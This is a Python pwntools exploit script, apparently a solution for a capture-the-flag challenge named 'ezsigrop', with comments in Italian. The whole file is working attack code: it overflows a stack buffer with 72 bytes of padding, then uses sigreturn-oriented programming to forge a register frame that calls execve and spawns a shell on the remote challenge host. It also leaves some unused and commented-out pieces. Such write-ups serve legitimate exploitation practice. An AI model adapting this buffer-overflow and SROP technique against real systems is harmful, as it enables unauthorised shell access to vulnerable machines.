#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
# from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './ezsigrop')
context.arch = 'amd64'
# lib = CDLL(exe.libc.path)
host = args.HOST or 'ezsigrop.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x40102b
continue
'''.format(**locals())

# -- Exploit goes here --

shell = 0x401036

io = start()

system = 0x401032
reading = 0x401015
padding = b"A" * 72
frame = SigreturnFrame()
frame.rax = 59 
frame.rdi = shell
frame.rsi = 0
frame.rdx = 0
frame.rbp = 0x401013
frame.rip = 0x401013

payload = flat(padding, system, b"B" * 15, system)

print(len(frame))
io.sendline(padding + # padding
        p64(0x401015) # 2) read 
         + p64(0x401013) + bytes(frame) # sigreturn
)

sleep(5)
# io.send(b"A"*4096)
print("Inviato rax")
io.send(b"B" * 15) # seconda read per settare il rax a 0xf
#io.send(bytes(frame)) # terzo send per il frame

io.interactive()

